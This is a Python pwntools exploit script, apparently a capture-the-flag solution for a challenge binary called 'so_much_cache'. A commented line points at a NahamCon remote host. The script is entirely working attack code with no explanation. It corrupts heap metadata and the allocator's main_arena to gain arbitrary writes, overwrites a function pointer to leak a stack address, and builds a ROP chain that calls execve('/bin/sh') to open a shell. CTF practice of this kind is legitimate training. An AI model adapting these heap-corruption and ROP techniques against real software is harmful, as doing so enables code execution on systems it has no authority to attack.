#!/usr/bin/env python3


from pwn import *


e = ELF("./so_much_cache")
r = process("./so_much_cache")
#r = remote("challenge.nahamcon.com",32435)

def allocate(size,data):
    r.sendlineafter(b"select [1-5] :",b"1")
    r.sendlineafter(b"size :",f"{size}")
    r.sendafter(b"data :",data)

def free():
    r.sendlineafter(b"select [1-5] :",b"2")

def prep():
    r.sendlineafter(b"select [1-5] :",b"4")

def jump(index):
    r.sendlineafter(b"select [1-5] :",b"5")
    r.sendlineafter(b"Where do you want to jump? (1, 2, or 3)",f"{index}")

def exit():
    r.sendlineafter(b"select [1-5] :",b"3")

allocate(0x18,b"A" * 0x10 + p64(0x43fdaf))
free()
prep()
allocate(0x68,b"A" * 0x38)
free()
allocate(0x38,b"A" * 0x20)
free()
allocate(0x68,b"A" *  0x68 + p64(0x41) + p64(0x61))
allocate(0x38,b"A" * 0x20)
allocate(0x48,b"A" * 0x20)
free()
allocate(0x58,b"A")
free()
allocate(0x48,b"A" * 0x48 + p64(0x61) + p64(e.sym.main_arena+ 16))
allocate(0x58,b"B")
allocate(0x58,b"\x00" * 8 + p64(0x6cb810) + b"\x00" * 0x28  + p64(0x6cd170))
for i in range(0,8):
    allocate(0x78,b"\x00")
allocate(0x78,b"\x00" * 0x68 + p64(e.sym.puts))
allocate(0x58,b"\x00" * 8 + p64(0x6cb810) + b"\x00" * 0x28  + p64(0x6cd5f0))
allocate(0x68,b"A" * 0x40)
free()
r.recvuntil(b"A" * 0x40)
leak = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00'))
allocate(0x58,b"\x00" * 8 + p64(0x6cb810) + b"\x00" * 0x28 + p64(leak - 0x148)  + p64(0) + p64(0x6cb858) * 2)
allocate(0x48,b"/bin/sh\x00" + b"A" * 0x18  + p64(0x4204e4) + p64(0x3b) + p64(0x4018c6) + p64(leak - 0x138) + p64(0x401362) + p64(0) + p64(0x443976) + p64(0) + p64(0x46fc05))
jump(3)
r.interactive()
